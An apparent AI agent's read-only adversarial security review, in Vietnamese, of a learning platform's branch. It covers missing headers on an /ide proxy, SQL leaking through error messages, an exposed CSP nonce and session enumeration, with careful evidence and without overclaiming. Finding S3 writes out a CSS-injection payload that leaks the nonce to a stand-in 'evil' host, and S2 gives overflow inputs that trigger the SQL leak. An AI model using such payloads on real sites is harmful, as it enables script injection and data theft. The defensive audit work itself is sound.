# Rà soát đối kháng P13 — An ninh & phân quyền

**Ngày:** 2026-09-06 · **Nhánh:** `feat/p13-frontend` · **Diff:** `feat/p12-scale-proof..HEAD`
**Phạm vi:** chỉ chiều an ninh & phân quyền (6 mục brief). **Chỉ đọc** — không sửa file mã nguồn nào.
**SSOT hợp đồng đã đọc:** `plans/devops-learning-platform/phase-13-exec.md` §1 (D1–D15), §2 (C3, C4).

Mỗi phát hiện kèm **kịch bản hỏng cụ thể** (input/state → hậu quả) và `file:dòng`.
Xếp theo mức nghiêm trọng giảm dần. Chỗ nào tôi không dựng được bằng chứng, tôi ghi
thẳng **"chưa đủ bằng chứng"** kèm phép đo sẽ chốt được nó — không đoán.

---

## Nghiêm trọng

### S1 — `/ide` mở một cửa TRÊN CHÍNH ORIGIN của app mà KHÔNG có một security header nào

**Đây là thay đổi ranh giới bảo mật lớn nhất của P13, và nó không có phép kiểm nào gác.**

Ba sự thật, mỗi cái kiểm được độc lập:

1. `apps/web/src/proxy.ts:222` — `config.matcher` chỉ áp cho request **Next xử lý**.
   `/ide` không tới Next: Ingress `-ide` route thẳng sang Service gateway
   (`infra/helm/platform/templates/ingress.yaml`, block `{{ $fullname }}-ide`, path `/ide`
   → `{{ $fullname }}-gateway`). Nên `applySecurityHeaders` **không bao giờ chạy** cho `/ide/**`.
2. Ingress `-ide` gắn đúng **hai** middleware: `bodylimit` + `ratelimit-ide`
   (`ingress.yaml`, `$annIde`). Chart **không có** middleware headers nào —
   `ls infra/helm/platform/templates/middleware-*` cho ra đúng `bodylimit`, `ratelimit`,
   `redirect`. Không có nguồn thứ ba đặt header.
3. `services/terminal-gateway/internal/ideroute/ideroute.go:239-262` — `httputil.ReverseProxy`
   chỉ viết lại **request** (`Rewrite`), không đụng response header. Header trả về là header
   Theia phát ra, nguyên vẹn.

**Hệ quả:** mọi response dưới `https://<host>/ide/**` — **cùng origin với toàn bộ app** —
đi ra trình duyệt **không** `Content-Security-Policy`, **không** `X-Content-Type-Options: nosniff`,
**không** `Referrer-Policy`, **không** `X-Frame-Options`. Trước P13 origin này chỉ được Next
phục vụ, và mọi tài liệu đều mang CSP nonce + `strict-dynamic` (`server/security/headers.ts:9-30`).

**Kịch bản hỏng:** pod sandbox là môi trường người học có shell (P1–P6). Theia trong pod đó
phục vụ file workspace ra dưới `/ide/session/{id}/…`. Một tài nguyên phục vụ với content-type
suy đoán được — không có `nosniff` để chặn — được trình duyệt diễn giải như **tài liệu của
app-origin**. Script chạy ở đó:

- `fetch('/api/trpc/me.updatePreferences?…')` mang cookie phiên Better Auth (`SameSite=Strict`
  nhưng đây là same-site ⇒ **vẫn gửi**);
- đọc/ghi `localStorage` của origin (gồm `dlp.theme`);
- `parent.document` — cùng origin nên **không** bị chặn; đọc được cả `data-nonce` (xem S3).

Nếu người mở IDE là `author` hay `admin`, cùng đường đó gọi được `authoring.*` / `admin.*`.

**Chưa đủ bằng chứng:** tôi KHÔNG chứng minh được Theia thật sự phục vụ một file workspace
với content-type sniff được — tôi không đọc route của Theia và `/ide` chưa từng đi qua Traefik
(ingress.yaml tự ghi: "6.A/6.B/6.E đều đo qua port-forward"). **Phép đo chốt được:**

```
curl -ksI -H 'Cookie: dlp_sandbox=<token>' \
  "https://dlp.192.168.94.130.sslip.io:30443/ide/session/<id>/<đường-file-workspace>"
```
đọc `Content-Type` và xem có `X-Content-Type-Options` không. Vế "0 header an ninh trên đường
`/ide`" thì **đã chắc** từ chart + mã, không cần đo.

**Về mục 4 của brief — `frame-src 'self'` có đủ hẹp không:** không. `'self'` là lựa chọn
**rộng nhất về đặc quyền**, không phải hẹp nhất: một iframe **cùng origin** có nhiều quyền
hơn hẳn một iframe khác origin (khác origin thì bị chặn `parent.document`, không chia sẻ
storage, không mang cookie của app). D8 lập luận "cùng origin để cookie đi được"
(`phase-13-exec.md` §1 D8) — đúng về cơ chế cookie, nhưng nó **đánh đổi cách ly origin**, và
đánh đổi đó không được ghi ở bất kỳ đâu trong D8. Thứ THẬT SỰ gác đường này là
`sessionauth.CheckSession` trong `ideroute.go:158-170` + phạm vi cookie `Path=/ide` —
không phải directive CSP.

**Điểm cộng đã kiểm (không phải phát hiện):** `ideroute.go:255` xoá header `Cookie` trước khi
proxy vào pod, nên token phiên **không** vào tiến trình người học điều khiển. Đó là phần đã làm đúng.

---

## Quan trọng

### S2 — `errorFormatter` không lột `message`: lỗ rò SQL vẫn CÒN, chỉ triệu chứng bị bịt

Brief hỏi lỗ cursor-uuid đã bịt kín chưa. **Triệu chứng thì bịt, gốc thì chưa.**

Chuỗi rò, từng mắt xích đã đọc tận mã:

| Mắt xích | Bằng chứng |
|---|---|
| `errorFormatter` chỉ thêm `zodError`, giữ nguyên `...shape` | `apps/web/src/server/trpc/init.ts:60-72` |
| `getErrorShape` đặt `message: error.message` vào shape trả về client | `node_modules/.pnpm/@trpc+server@11.18.0_…/dist/getErrorShape-BPSzUA7W.mjs:255` |
| Lỗi lạ → `TRPCError` không message → rơi về `cause.message` | cùng gói, `dist/tracked-DWInO6EQ.mjs:30-44` |
| Lỗi Drizzle mang NGUYÊN câu SQL + params | `node_modules/.pnpm/drizzle-orm@0.45.2_…/drizzle-orm/errors.js:10-13` — `` `Failed query: ${query}\nparams: ${params}` `` |

Bản vá P13 là `assertUuidCursor` đặt **tại từng call-site** (`init.ts` cuối file; dùng ở
`server/trpc/routers/me.ts:334` và `server/admin/audit.ts:70`). Đó là đuổi triệu chứng: mọi
đường DB mới trong tương lai lại phải nhớ tự bịt.

**Ba kịch bản CÒN SỐNG hôm nay, không đường nào cần cursor:**

1. **Tràn `integer` qua `authoring.create` / `authoring.update`.**
   `apps/web/src/server/trpc/routers/authoring.ts:96` — `weight: z.number().int().positive()`,
   **không có `.max()`**. Cột đích `content_steps.weight` là `integer` 32-bit
   (`apps/web/src/server/db/schema.ts:604`).
   → gửi `steps: [{ …, weight: 3000000000 }]` ⇒ Postgres `22003 value out of range for type
   integer` ⇒ 500 kèm **nguyên câu INSERT và toàn bộ params** (markdown, `setup*`,
   `verifyScript`, `author_id`).
2. **Y hệt với `estimatedMinutes`** — `authoring.ts:130` `z.number().int().positive()` ↔
   `schema.ts:464` `estimated_minutes integer`.
3. **TOCTOU trùng khoá chính.** `authoring.ts:341-355`: `contentIdTaken()` rồi mới
   `insert(contentItems)`. Hai request đồng thời cùng `id` (một cú double-click vào nút "Tạo")
   ⇒ `23505 duplicate key` ⇒ cùng đường rò.

Vai trò cần: `author`. Hậu quả: lộ schema DB, tên cột, hình dạng truy vấn và tham số của người gọi —
đúng lớp lỗi mà lượt rà trước đã tìm ra, chỉ đổi cửa vào.

**Cùng lỗ hổng ở tầng gRPC, và P13 vừa mở nó cho MỌI user.**
`apps/web/src/server/grpc/orchestrator-client.ts:88-96` đặt
`message: \`orchestrator gRPC: ${error.rawMessage || error.message}\`` và
`Code.Unavailable → 'INTERNAL_SERVER_ERROR'` (dòng 68). P13 thêm hai procedure mà **bất kỳ user
đã đăng nhập nào** cũng gọi được và đều đi qua đây: `capacity.get`
(`server/trpc/routers/capacity.ts:11`, `protectedProcedure`) và `me.activeSessions`
(`routers/me.ts:166`). Khi orchestrator không với tới được, chuỗi lỗi mạng nội bộ đi thẳng ra
trình duyệt người học.
*Mức bằng chứng:* đường đi đã đọc tận mã và chắc; **nội dung chính xác** của `rawMessage`
(có kèm `host:port` nội bộ hay không) thì **chưa đo** — chốt bằng cách scale orchestrator về 0
rồi gọi `capacity.get` và đọc body 500.

**Chỗ sửa đúng là một chỗ:** trong `errorFormatter`, khi `error.code === 'INTERNAL_SERVER_ERROR'`
thì thay `message` bằng chuỗi trung tính và log nguyên bản ở server. Guard theo call-site
sẽ phải đuổi mãi mãi.

### S3 — Nonce CSP bị publish vào DOM, và `style-src 'unsafe-inline'` biến nó thành thứ dò được

`apps/web/src/app/layout.tsx:83` render `<body … data-nonce={nonce}>`.
`apps/web/src/server/security/headers.ts:11` giữ `style-src 'self' 'unsafe-inline'`.

**Kịch bản hỏng:** một lỗ chèn HTML **không cần chèn script** ở bất kỳ trang nào →
chèn `<style>body[data-nonce^="a"]{background:url(https://evil/a)}…</style>`, dò nonce từng
ký tự bằng attribute selector (`unsafe-inline` cho phép), rồi chèn
`<script nonce="<đã dò>">`. Vì `script-src` có `'strict-dynamic'` (`headers.ts:10`), script đó
sau đó nạp được bất cứ gì nó muốn. Nói cách khác: CSP nonce của cả app rớt về xấp xỉ
`unsafe-inline` trước một kẻ chỉ chèn được HTML.

**`data-nonce` KHÔNG có người đọc.** `grep -rn "data-nonce\|dataset.nonce" apps/web/src packages/`
trả về **đúng một** kết quả — chính dòng ghi ra nó. Nó là thuộc tính chết: rủi ro thuần, không đổi
lấy gì.

**Trung thực về nguồn gốc:** dòng này có từ P0, **không phải** do P13 tạo ra (nó nằm ở cả vế `-`
lẫn vế `+` của `git diff … -- src/app/layout.tsx`). Nhưng P13 là phase **nới CSP** và là phase đầu
tiên tự tay nhúng một inline script gắn nonce (`layout.tsx:81`), nên đây đúng là lượt phải soi nó.

### S4 — `ListSessions(user_id = '')` biến "đoán được chủ phiên" thành "được phát danh bạ"

`ListSessions` ở orchestrator **không có authz nào** — đúng hợp đồng C3
(`phase-13-exec.md` §2 C3: *"BFF là ranh giới tin cậy"*), và mã nói đúng như vậy
(`services/orchestrator/internal/lifecycle/list_sessions.go:49-51`). Lọc theo `user_id` là có
thật và đúng (`list_sessions.go:167-169` so `sessUserID != userID` rồi `continue`), `user_id`
rỗng = mọi user.

Vấn đề không nằm ở phép lọc mà ở **thứ RPC này cho không**. Trước P13, một kẻ đã có chỗ đứng
in-cluster muốn reap phiên người khác phải đoán **cả** `session_id` **lẫn** `user_id` của chủ
phiên (`reap.lua` chốt `actor.userId == session.userId`). Sau P13, một lời gọi
`ListSessions("")` trả về **cả hai** cho mọi phiên đang sống. Chính chú thích trong
`services/orchestrator/internal/grpcserver/session_service.go:244-245` viết ra đường vòng đó:
*"đường vòng `ListSessions("") → reap theo user_id` vẫn mở"* — nó được nêu như một **lý lẽ**
biện minh cho việc nới nhánh `admin_user_id`, chứ không được ghi vào đâu như một **rủi ro mới**.

**Điều kiện tiên quyết (nói rõ để không thổi phồng):** cần với tới `orchestrator:9090`.
`values.yaml:684` đặt `grpcMtlsMode: 'require'` và `values-selfhost.yaml` không override
(grep 0 kết quả), nên cần **client cert do CA nền tảng ký** — tức phải chiếm được `apps/web`
hoặc `gateway`, cộng netpol. Nên đây là **defense-in-depth**, không phải đường tấn công từ
internet. Điều đổi là: **một thành phần bị chiếm nay làm được nhiều hơn hẳn trước** — từ
"reap phiên của những user tôi đã biết id" thành "liệt kê rồi reap sạch mọi phiên đang chạy".

Đề xuất (không sửa): C3 nên ghi thêm đánh đổi này; và nếu muốn thu hẹp, `ListSessions` với
`user_id` rỗng có thể đòi cùng cổng `MTLSEnabled && !InCluster ⇒ từ chối` mà nhánh
`admin_user_id` đã có (`session_service.go:239-245`) — không cần allowlist CN.

### S5 — `''` là "mọi user", và trình biên dịch không cản ai truyền nhầm nó

`apps/web/src/server/sessions/list.ts:17-22` — `options.userId: string`. Chú thích trong chính
file đó nói rất đúng rằng **giá trị này LÀ quyết định authz**, nhưng kiểu của nó thì không nói
gì cả: `''` (mọi user) và `ctx.user.id` (chỉ tôi) cùng là `string`.

**Kịch bản hỏng:** một lane sau này viết
`listSessionsPage(ctx, { userId: input.userId ?? '', … })` trong một `protectedProcedure` —
typecheck **xanh**, lint **xanh**, và mọi phiên của mọi user chảy ra cho user thường. Không có
test nào hôm nay bắt được hình dạng đó (`admin-authz.test.ts` chỉ khẳng định hai call-site
hiện có gửi đúng gì).

Hôm nay **không có vi phạm** — đã grep toàn `apps/web/src`: đúng hai call-site
(`routers/me.ts:166` truyền `ctx.user.id`, `routers/admin.ts:69` truyền `''` sau
`adminProcedure`), và `endSessionAs` đúng một (`routers/me.ts:171`). Đây là phát hiện về
**hình dạng API**, không phải về một lỗi đang có.

Đề xuất (không sửa): đổi tham số thành union rõ ý —
`{ scope: 'mine'; userId: string } | { scope: 'all' }` — để "mọi user" phải được **gõ ra bằng
chữ**, không phải rơi vào bằng một `?? ''`.

---

## Nhỏ / quan sát

### S6 — `admin.health` trả `error` nguyên văn ra trình duyệt

`apps/web/src/server/admin/health.ts` (nhánh `catch` của `fetch` và của `response.text()`) đặt
`error: cause instanceof Error ? cause.message : String(cause)`. Với một lỗi mạng, chuỗi này
mang tên/IP nội bộ (`ECONNREFUSED <clusterIP>:8081`). Chỉ `admin` đọc được, và nó chính là thứ
làm trang health hữu ích — nhưng nó là dữ liệu hạ tầng đi ra trình duyệt, đáng biết.
Không đề nghị đổi.

### S7 — Cổng `rule-08-no-token-in-url` hẹp hơn điều nó tự tuyên bố

`apps/web/src/security/rule-08-no-token-in-url.test.ts:36` quét từ
`path.resolve(import.meta.dirname, '..')` = **chỉ `apps/web/src`**. Docstring thì viết
*"grep codebase 0 kết quả"*. Ngoài phạm vi: `apps/web/e2e/**` (**mới ở P13**, có đăng ký tài
khoản + `promote-role.sh`), `packages/**` (nơi `packages/terminal` dựng URL WS), `services/**`.

**Nó KHÔNG phải phép kiểm rỗng** — vẫn quét >10 file thật và vẫn đỏ được nếu vi phạm nằm trong
`src`. Nhưng nó **không thể đỏ** nếu token-in-URL xuất hiện ở `e2e/` hoặc `packages/`.
Đã grep tay `apps/web/e2e/` cho `[?&](access_)?token=`: **0 kết quả** — nên hôm nay không có
vi phạm; đây là hụt phạm vi của cổng, không phải một lỗ đang mở.

### S8 — `/ide` không có `frame-ancestors` / `X-Frame-Options` (hệ quả của S1, tách ra vì kết luận khác)

Site ngoài **nhúng được** `/ide/session/{id}/` vào iframe (không header nào cấm). Nhưng cookie
`dlp_sandbox` là `SameSite=Strict` (`server/auth/sandbox-cookie.ts:52-58`), nên request nhúng
cross-site **không mang cookie** ⇒ `CheckSession` từ chối. Cái nhúng được chỉ là một trang lỗi.
**Không phải lỗ hổng khai thác được**, ghi ra để không ai đọc S1 rồi kết luận quá tay.

---

## Đã kiểm, KHÔNG có phát hiện

Ghi ra để phân biệt "đã soi" với "chưa soi" (`negative-result-scope`).

**Phân quyền tRPC (mục 1)**
- `adminProcedure` (`server/trpc/init.ts:~150`) — `role !== 'admin' ⇒ FORBIDDEN`, **không** có
  nấc trung gian; `author` KHÔNG lọt. Cả **6** procedure `admin.*` đều đứng sau nó
  (`routers/admin.ts:47,53,69,74,91,95`).
- `role` **không bao giờ** đến từ client: `createTRPCContext` đọc từ session Better Auth và
  allowlist về `'user'` khi lạ (`init.ts:44-56`, `toRole`).
- Không procedure nào nhận `userId`/`authorId` của resource từ input. `authoring.*` chứng minh
  bằng chính schema (`security/authoring-idor.test.ts` duyệt `_def.inputs`), `me.*` đọc
  `ctx.user.id` ở mọi nhánh.
- `authoring.get` (bề mặt đọc MỚI của P13) có **cả hai** cổng: `authorProcedure` + đọc
  `author_id` **từ DB** rồi `assertContentOwner` (`routers/authoring.ts:311-315`).
  `assertContentOwner` ném `NOT_FOUND` chứ không `FORBIDDEN` (`content/authz.ts:47-56`) — không
  xác nhận sự tồn tại của bài người khác. Ba message `NOT_FOUND` trên đường này giống nhau từng byte.
- `admin.users.setRole` chặn admin tự hạ quyền chính mình, và chặn **trong lớp service** chứ
  không ở router (`server/admin/users.ts:78-83`).
- Cổng trang: `/admin` và `/author` gác vai trò ở `layout.tsx` server
  (`app/admin/layout.tsx`, `app/author/layout.tsx`), không phải ở `proxy.ts` — đúng C6 và đúng
  lý do (proxy không đụng DB nên không biết vai trò).

**Rò dữ liệu qua lỗi (mục 2)** — ngoài S2: `quiz.submit` đối chiếu `questionId`/`choiceId` với
`Map` nạp từ DB **trước** khi chạm cột `uuid` (`routers/quiz.ts:179-206`);
`lessons.saveProgress` chặn `stepIndex` vượt số bước bằng 400 trước khi ghi
(`routers/lessons.ts:541-546`) nên không tràn `integer`; `decodeContentCursor` ép `sortValue`
phải là số nguyên trước khi vào `::int` (`packages/scenario/src/source.ts:227-231`).

**Cookie & phiên (mục 3)** — `buildSandboxCookie` phát đủ `HttpOnly; Secure; SameSite=Strict`,
**không** `Domain`, `Max-Age` = thời gian còn lại thật của phiên
(`server/auth/sandbox-cookie.ts:47-58`, `attachSandboxCookie` dòng ~100). Hai cookie cùng tên
khác `Path` (`/ws`, `/ide`) — `SANDBOX_COOKIE_PATHS` là hằng duy nhất, **không** cookie nào
`Path=/`. Test đã siết đúng chỗ và còn **sửa một assertion không-thể-đỏ**:
`security/sandbox-token-cookie.test.ts` bỏ `cookie.endsWith('Path=/')` (không bao giờ đỏ vì
`Path` luôn có thuộc tính nối sau) và thay bằng khẳng định **tập giá trị**
`[...new Set(paths)].sort() === ['/ide','/ws']`. Đó là đúng cách.
Không có token trong URL trên đường IDE: `components/session/ide-layout.ts:26` dựng
`/ide/session/${encodeURIComponent(sessionId)}/`, không query param.

**CSP (mục 4)** — ngoài S1/S3: `THEME_INIT_SCRIPT` là **hằng chuỗi tĩnh**, allowlist đúng ba
giá trị `'light'|'dark'|'system'` và chỉ thêm/bớt class `dark`
(`packages/ui/src/theme/theme-provider.tsx:36`) — không có đường nào để localStorage biến thành
mã chạy. `script-src` **không** rơi về `unsafe-inline`; đúng một `dangerouslySetInnerHTML`
trong toàn `apps/web/src`, và nó gắn nonce (`app/layout.tsx:81`). Nonce sinh từ
`crypto.randomUUID()` mỗi request, đặt bằng `set` (không `append`) nên header `x-nonce` do
client gửi bị **ghi đè**, không tin được (`proxy.ts:213`).

**Ranh giới BFF ↔ orchestrator (mục 5)** — ngoài S4/S5: không có chỗ nào `userId` gửi xuống
orchestrator đến từ input client. `lessons.checkStep`/`runSetup` **có** nhận `sessionId` từ
client, nhưng token BFF mint mang `sub = ctx.user.id` và `GetSession` kiểm chủ sở hữu trước
(`server/labs/session.ts:42-58`) — chú thích tại `routers/lessons.ts:184-188` nói đúng cơ chế.
`attachSandboxCookie` **không** mint cookie khi `ctx.user.id !== ownerUserId`
(`sandbox-cookie.ts:~86`), nên đường admin-tạo-hộ không phát chìa khoá shell của người khác.
Đường admin reap tách hẳn khỏi đường user (`server/admin/terminate.ts` vs
`server/sessions/list.ts:48`), `reason` thu hẹp thành literal nên trình biên dịch chặn việc
nối lại đường cũ. Nhánh `admin_user_id` ở orchestrator có cổng riêng
`MTLSEnabled && !InCluster ⇒ PermissionDenied` (`session_service.go:224-249`).
`ListSessions` lọc `user_id` đúng (`list_sessions.go:167-169`).

**Bí mật (mục 6)** — quét diff `apps/web` + `packages` cho `AKIA|ghp_|sk-…|BEGIN … PRIVATE KEY|
password=…|secret=…`: **0 kết quả**. `apps/web/.env.example` và
`services/orchestrator/.env.example` chỉ thêm `ORCHESTRATOR_METRICS_URL` /
`GATEWAY_METRICS_URL`, giá trị rỗng hoặc `http://localhost:8081/metrics` — không giá trị thật.
`apps/web/e2e/env.ts` chỉ chứa URL cụm lab, không credential (tài khoản e2e đăng ký mới mỗi lượt).

**Ghi chú không phải phát hiện an ninh:** `env.ts` mô tả `orchestratorMetricsUrl()` là "bắt buộc
(`requireEnv`)" trong khi `admin/health.ts` cố tình bọc nó bằng `resolveUrl` để nuốt cú ném và
biến thành trạng thái `reached:false`. Hai chú thích nói ngược nhau; hành vi thực tế
(`health.ts`) là cái đúng. Chỉ là tài liệu lệch.

---

## Tổng kết

| # | Mức | Một dòng |
|---|---|---|
| S1 | Nghiêm trọng | `/ide` phục vụ nội dung trên chính origin của app mà không có CSP/nosniff/XFO nào |
| S2 | Quan trọng | Gốc rò SQL (`errorFormatter` giữ `message`) chưa bịt; còn 3 đường sống, không cần cursor |
| S3 | Quan trọng | Nonce CSP publish vào `data-nonce` + `style-src 'unsafe-inline'` ⇒ dò được nonce |
| S4 | Quan trọng | `ListSessions('')` phát danh bạ (sessionId + userId) cho mọi thứ chạm được orchestrator |
| S5 | Quan trọng (hình dạng API) | `''` = "mọi user" nhưng kiểu là `string` — không có gì cản một `?? ''` tương lai |
| S6 | Nhỏ | `admin.health.error` trả chuỗi lỗi mạng nội bộ ra trình duyệt admin |
| S7 | Nhỏ | Cổng `rule-08` chỉ quét `apps/web/src`, không phủ `e2e/` (mới ở P13) và `packages/` |
| S8 | Quan sát | `/ide` nhúng được cross-site, nhưng `SameSite=Strict` làm nó vô hại |

**Phép kiểm không-thể-đỏ:** brief yêu cầu báo riêng. Tôi tìm được **một**, và **P13 đã tự sửa
nó** — `expect(cookie.endsWith('Path=/')).toBe(false)` trong
`security/sandbox-token-cookie.test.ts`, không bao giờ đỏ được vì `buildSandboxCookie` luôn nối
`Max-Age`/`HttpOnly`/`Secure`/`SameSite` **sau** `Path`. Bản mới khẳng định theo tập giá trị.
Ngoài ra, S7 là một cổng **hụt phạm vi** (không phải không-thể-đỏ: nó đỏ được trong `src`), và
S1 là một quyết định **không có cổng nào gác** (`rule-09-headers.test.ts` chỉ kiểm chuỗi CSP mà
Next phát ra — nó **structurally** không nhìn thấy đường `/ide`, vì `/ide` không đi qua `proxy.ts`).

**Không chạy được phép kiểm nào:** tôi không chạy `pnpm --filter web test` cho các bộ mới —
`admin-authz.test.ts`, `me-idor.test.ts`, `session-dedupe.test.ts`,
`authoring-get-draft.test.ts`, `list-cursor-contract.test.ts` đều cần Postgres thật
(`test-helpers.ts` → `testDb()`), và bốn lane khác đang chạy song song trên cùng cây làm việc
nên tôi không khởi động dịch vụ. Kết luận về **chất lượng** các bộ test đó là từ **đọc mã**, không
từ một lượt chạy. Chúng đều có đối chứng dương tường minh, đó là điểm mạnh thật.

**Status:** DONE_WITH_CONCERNS
**Deliverable:** `D:\NCKH\DevOps_Learning_Platform\reports\harness\2026-09-06-p13-review\security.md`
**Concerns:** S1 cần một lượt `curl` trên cụm để chốt mức khai thác; S2 nên sửa ở
`errorFormatter` (một chỗ) thay vì thêm guard theo call-site.

---

## Ghi chú giao nộp (không phải phát hiện an ninh)

Theo chỉ dẫn giữa chừng của lead: **không** `git add`/`git commit` file này. Đã tuân thủ —
`git status --short` chỉ có `?? reports/`, không file mã nguồn nào bị tôi đổi.

Nhưng **cơ chế mà lead nêu thì sai**, ghi lại để lần sau không ai suy tiếp từ nó:

- `.gitignore` dòng 72 là `plans/devops-learning-platform/reports/harness/*/.barrier-*/` —
  một đường KHÁC (`plans/…/reports/`), và nó chặn thư mục rào chắn của harness, không chặn
  `reports/` ở gốc repo.
- `git check-ignore -v reports/harness/2026-09-06-p13-review/security.md` → **exit 1**
  (không khớp luật ignore nào). Tức `git add` sẽ **thành công**, không báo lỗi như lead dự đoán.

**Kết luận của lead vẫn đúng**, chỉ vì một lý do khác: `git ls-files reports | wc -l` = **0** —
toàn bộ `reports/` chưa từng được git theo dõi. Đó là một **quy ước**, không phải một hàng rào
kỹ thuật. Ai muốn nó là hàng rào thật thì phải thêm `reports/` vào `.gitignore`; tới lúc đó,
một `git add -A` của bất kỳ ai sẽ kéo cả thư mục này lên.

Đúng lớp lỗi mà C6bis của chính exec plan đã ghi: *"một lý lẽ đúng kết luận nhưng sai cơ chế
sẽ đẻ ra niềm tin rằng đã có ai đó gác, và niềm tin đó tồn tại lâu hơn cái sai."*
